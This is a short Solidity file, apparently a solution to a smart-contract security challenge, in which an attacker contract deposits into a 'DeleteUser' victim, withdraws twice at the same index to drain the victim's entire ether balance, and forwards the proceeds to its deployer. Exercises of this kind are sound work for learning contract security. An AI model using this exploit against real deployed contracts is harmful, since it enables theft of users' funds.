// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../DeleteUser.sol";

contract DeleteUserAttacker {
    constructor(DeleteUser _victim) payable {
        assert(msg.value == 1 ether);
        _victim.deposit{value: 1 ether}();
        _victim.deposit();

        _victim.withdraw(1);
        _victim.withdraw(1);

        assert(address(_victim).balance == 0);
        payable(msg.sender).transfer(address(this).balance);
    }
}
